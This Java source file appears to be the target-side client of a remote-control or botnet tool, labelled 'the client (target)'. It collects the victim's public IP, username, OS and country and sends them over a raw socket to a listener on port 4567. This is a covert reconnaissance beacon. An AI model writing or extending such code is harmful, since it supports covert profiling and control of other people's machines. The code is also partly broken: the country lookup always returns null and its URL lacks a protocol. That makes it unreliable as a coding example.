package client;

import org.json.JSONObject;

import java.io.*;
import java.net.*;
import java.util.Scanner;

/**
 * The main class for the client (target)
 * Syntax: IP::USERNAME::OS::COUNTRY::
 */
public class Client {

    static String ip;
    static String username;
    static String os;
    static String country;


    public static void main(String[] args) throws IOException{
        sendInfo();
    }


    public static void sendInfo() throws IOException{
        Socket conn = new Socket("0.0.0.0", 4567);
        PrintWriter pw = new PrintWriter(conn.getOutputStream(), true);
        pw.write(getInfo());
    }

    public static String getInfo() throws IOException{
        ip = getWanIP();
        username = getLocalUname();
        os = getOs();
        country = getCountry();
        return new StringBuilder(ip).append("::"+username).append("::"+os).append("::"+country).toString();
    }

    private static String getWanIP() throws MalformedURLException, IOException{
        URL whatismyip = new URL("http://checkip.amazonaws.com");
        BufferedReader in = new BufferedReader(new InputStreamReader(
                whatismyip.openStream()));

        return in.readLine();
    }

    private static String getLocalUname() {
        return System.getProperty("user.name");
    }

    private static String getOs() {
        return System.getProperty("os.name");
    }

    private static String getCountry() {

        String result = null;
        try {
            URL url = new URL("freegeoip.net/json/" + ip);
            URLConnection connection = url.openConnection();
            InputStream response = connection.getInputStream();
            Scanner s = new Scanner(response).useDelimiter("\\A");
            result = s.hasNext() ? s.next() : "";  // wtf is this

            JSONObject resultJson = new JSONObject(result);

        } catch (Exception e) {

        }
        return null;
    }

}
